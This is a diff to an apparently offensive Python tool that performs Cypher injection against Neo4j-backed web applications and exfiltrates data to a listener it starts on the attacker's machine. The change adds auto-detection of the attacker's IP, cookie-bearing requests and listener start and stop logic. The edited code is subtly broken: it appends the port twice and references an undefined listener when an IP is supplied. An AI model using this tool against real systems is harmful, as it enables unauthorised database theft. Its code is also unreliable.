@@ -2,6 +2,7 @@ import argparse
 import requests
 import urllib.parse
 import threading
+import socket
 from http.server import HTTPServer, BaseHTTPRequestHandler
 
 class RequestHandler(BaseHTTPRequestHandler):
@@ -18,17 +19,24 @@ class RequestHandler(BaseHTTPRequestHandler):
     def log_message(self, format, *args):
         return
 
-def start_listener(port):
-    server_address = ('', port)
-    httpd = HTTPServer(server_address, RequestHandler)
-    print(f"Listening on port {port}...")
-    httpd.serve_forever()
+class Listener():
+    
+    def __init__(self, port):
+        self.server = HTTPServer(("0.0.0.0", port), RequestHandler)
+
+    def start_listener(self):
+        print("starting listener...")
+        self.server.serve_forever()
+
+    def stop_listener(self):
+        print("stopping listener...")
+        self.server.shutdown()
 
 
 class Neo4jInjector:
-    def __init__(self, target, exfil_ip, request_type, parameters, cookie=None):
+    def __init__(self, target, exfil_ip, listen_port, request_type, parameters, cookie=None):
         self.target = target
-        self.exfil_ip = exfil_ip
+        self.exfil_ip = exfil_ip + ":" + str(listen_port)
         self.request_type = request_type
         self.parameters = parameters
         # Check if a cookie was provided and split it into a dictionary if so
@@ -90,24 +98,37 @@ class Neo4jInjector:
 def main():
     parser = argparse.ArgumentParser(description="Inject payloads into Neo4j for educational purposes")
     parser.add_argument("-u", "--url", required=True, help="Target URL")
-    parser.add_argument("-l", "--exfil-ip", required=True, help="Exfiltration IP")
+    parser.add_argument("-l", "--exfil-ip", required=False, help="Exfiltration IP, ommitting this arg will make the program start its own listener")
     parser.add_argument("-t", "--type", required=True, choices=['API', 'GET', 'POST'], help="Request type: API/GET/POST")
-    parser.add_argument("-p", "--parameters", required=True, help="Vulnerable parameters")
+    parser.add_argument("-p", "--parameters", required=False, default="", help="Vulnerable parameters")
     parser.add_argument("-c", "--cookie", required=False, help="Optional cookie in format key=value")
-    parser.add_argument("--listen-port", required=True, type=int, help="Port for the listener to capture incoming data")
+    parser.add_argument("--listen-port", required=False, type=int, default=80, help="Port for the listener to capture incoming data")
 
     args = parser.parse_args()
 
+    if ((args.type == "GET" or args.type == "POST") and args.parameters == ""):
+        print("parameter required for GET and POST methods")
+        return
+    
+    # 
+    if (not args.exfil_ip):
+        hostname = socket.gethostname()
+        args.exfil_ip = socket.gethostbyname(hostname) + ":" + str(args.listen_port)
 
-    # Start the listener in a separate thread
-    listener_thread = threading.Thread(target=start_listener, args=(args.listen_port,))
-    listener_thread.daemon = True
-    listener_thread.start()
+        # Start the listener in a separate thread
+        listener = Listener(args.listen_port)
+        listener_thread = threading.Thread(target=listener.start_listener)
+        listener_thread.daemon = True
+        listener_thread.start()
 
-    injector = Neo4jInjector(args.url, args.exfil_ip, args.type, args.parameters, args.cookie)
+    injector = Neo4jInjector(args.url, args.exfil_ip, args.listen_port, args.type, args.parameters, args.cookie)
 
     # Begin exfiltration process
     injector.exfil_data()
+
+    # Shutdown the listener and join the thread
+    listener.stop_listener()
+    listener_thread.join()
 
 if __name__ == "__main__":
     main()
